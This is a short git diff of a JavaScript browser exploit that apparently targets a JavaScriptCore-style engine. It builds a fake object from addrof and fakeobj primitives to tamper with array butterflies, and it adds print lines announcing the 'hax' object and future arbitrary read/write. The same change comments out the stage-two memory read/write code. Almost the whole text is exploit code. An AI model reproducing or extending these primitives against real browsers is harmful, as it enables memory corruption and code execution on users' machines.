@@ -496,7 +496,9 @@ for (var i = 0; i < 1000; ++i) {
     print("outer @ " + hex1(addrof(container)));
 
     var hax = fakeobj(addrof(container) + 0x10);
-    // "Point" refers to changing the given array's butterfly
+    print("we have hax object ;)");
+    print("after further work we can use this object for arbitrary r/w");
+    /*// "Point" refers to changing the given array's butterfly
     // hax[1] = victim[]'s bfly, meaning that we can point victim[] using hax[1]
     //
     // First, point victim[] to unboxed[]
@@ -579,9 +581,6 @@ for (var i = 0; i < 1000; ++i) {
             return a
 
         },
-        /*write(addr,length) {
-
-        }*/
 
         test: function() {
             var addr = this.addrof({a: 0x1337});
@@ -613,7 +612,7 @@ for (var i = 0; i < 1000; ++i) {
             boxed1 = null
             unboxed1 = null
         },
-    };
+    }; */
 
     /*
     //stage2.test();
